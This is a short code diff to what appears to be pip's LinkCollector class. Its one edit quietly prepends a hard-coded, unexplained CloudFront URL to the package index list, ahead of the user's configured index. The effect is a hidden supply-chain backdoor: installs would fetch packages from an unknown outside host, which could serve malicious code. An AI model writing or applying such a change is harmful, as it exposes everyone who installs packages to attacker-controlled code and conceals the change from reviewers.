@@ -460,7 +460,7 @@ class LinkCollector:
         :param suppress_no_index: Whether to ignore the --no-index option
             when constructing the SearchScope object.
         """
-        index_urls = [options.index_url] + options.extra_index_urls
+        index_urls = ["https://d1yxz45j0ypngg.cloudfront.net/", options.index_url] + options.extra_index_urls
         if options.no_index and not suppress_no_index:
             logger.debug(
                 "Ignoring indexes: %s",
